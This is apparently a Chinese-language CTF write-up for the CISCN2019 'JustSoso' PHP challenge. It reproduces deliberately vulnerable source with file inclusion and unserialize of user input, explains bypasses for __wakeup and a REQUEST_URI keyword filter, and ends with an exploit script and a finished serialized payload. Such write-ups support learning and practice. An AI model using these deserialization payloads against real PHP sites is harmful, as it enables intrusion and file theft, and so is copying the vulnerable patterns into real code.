---
layout: post
title: CISCN2019 JustSoso
date: 2021-08-02 16:37 +0800
last_modified_at: 2021-08-02 16:37:00 +0800
tags: [CTF,Web,Write-up]
toc:  true
---
关键词：php，绕过，反序列化

这道题虽然看上去是一道反序列化题目，但是其实我个人感觉占比更大的是php的一些小trick。比如反序列化绕过`__wakeup`魔术方法，`///`绕过`$\_SERVER['REQUEST_URI']`和php深拷贝处理随机数比较等。buu上并没有题目复现，但是赛后放了源码，根据源码在本地搭建复现一波。

原题思路是，通过php伪协议读取index.php和hint.php，最终用反序列化获取到flag.php。

index.php

```
<?php
error_reporting(0);
$file = $_GET["file"]; 
$payload = $_GET["payload"];
if(!isset($file)){
    echo 'Missing parameter'.'<br>';
}
if(preg_match("/flag/",$file)){
    die('hack attacked!!!');
}
@include($file);
if(isset($payload)){  
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) { 
            die('stop hacking!');
            exit();
        }
    }
    $payload = unserialize($payload);
}else{ 
   echo "Missing parameters"; 
}

?>
```

hint.php

```
<?php  
class Handle{
    private $handle;
    public function __wakeup(){
        foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
    public function __construct($handle) { 
        $this->handle = $handle; 
    } 
    public function __destruct(){
        $this->handle->getFlag();
    }
}

class Flag{
    public $file;
    public $token;
    public $token_flag;
 
    function __construct($file){
        $this->file = $file;
        $this->token_flag = $this->token = md5(rand(1,10000));
    }

    public function getFlag(){
        $this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
        {
            if(isset($this->file)){
                echo @highlight_file($this->file,true); 
            }  
        }
}
}
?>
```

index.php中存在一个文件包含漏洞，而文件本身并不涉及反序列化所需的类，而hint.php中有两个类，其中Flag类的getFlag函数可以被利用获取flag。因而大致思路为通过index.php包含hint.php，再构造一个Handle类在析构的时候调用getFlag函数完成读取。

不过反序列化也只是这道题的基础，这道题主要难点在于去绕过`__wakeup`魔术方法和绕过`$_SERVER['REQUEST_URI']`。

`$_SERVER['REQUEST_URI']`绕过方法大致为在域名后加上`///`，在不妨碍http解析的情况下使该函数在判断的时候发生错误，返回false而不是应该返回的具体path。如此绕过对关键字flag的检测。（需要注意的是，这个小trick仅适用于php <= 5.4.7）。

对于`__wakeup`魔术方法的绕过为在输入反序列化字符串时增加反序列化对象数量，使得对象数量与实际对象数量不符，会产生报错从而不触发`__wakeup`魔术方法。

而随机数比较这里引入深浅拷贝的概念，即：

```
$a = 1;
$b = $a;  //浅拷贝
$a = 2;
$b == 1;  //true

$a = 1;
$b = &$a; //深拷贝
$a = 2;
$b == 1;  //false
$b == 2;  //true
```

即深拷贝可以理解为$b作为一个指向$a的指针，随着$a改变$b也在进行改变。因而在最后的随机数比较的地方，我们就可以用深拷贝解决这个问题。

最后给出exp：

```
<?php  
class Handle{ 
    private $handle;  
    public function __construct($handle) { 
        $this->handle = $handle; 
    }
}

class Flag{
    public $file;
    public $token;
    public $token_flag;
    
    function __construct($file){
        $this->file = $file;
        $this->token_flag = md5(rand(1,10000));
        $this->token = &$this->token_flag;
    }
}

$a = new Flag('flag.php');
$b = new Handle($a);
echo urlencode(serialize($b));
?>
```

以及最终的payload：

```
///?file=hint.php&payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%224bbbe6cb5982b9110413c40f3cce680b%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D
```



